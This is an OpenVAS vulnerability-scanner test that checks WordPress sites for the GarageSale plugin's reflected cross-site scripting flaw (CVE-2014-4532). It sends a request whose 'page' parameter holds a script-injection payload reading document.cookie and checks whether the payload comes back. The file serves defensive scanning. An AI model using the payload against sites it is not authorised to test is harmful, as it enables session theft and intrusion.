###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_garagesale_plugin_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress GarageSale plugin 'page' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804672");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-4532");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-07-10 11:09:51 +0530 (Thu, 10 Jul 2014)");
  script_name("WordPress GarageSale plugin 'page' Parameter Cross Site Scripting Vulnerability");


  script_tag(name:"summary", value:"This host is installed with Wordpress GarageSale Plugin and is prone to
cross site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'page' HTTP GET parameter to
templates/printAdminUsersList_Footer.tpl.php script is not properly sanitised
before returning to the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"WordPress GarageSale plugin before version 1.2.3");
  script_tag(name:"solution", value:"Upgrade to GarageSale plugin version 1.2.3 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/plugins/garagesale/changelog/");
  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-garagesale-a3-cross-site-scripting-xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://www.eibler.at/garagesale");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/garagesale/templates/printAdminUsersList_Fo' +
      'oter.tpl.php?page="</script><script>alert(document.cookie)</script>' ;

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:"garagesale-filter"))
{
  security_message(http_port);
  exit(0);
}
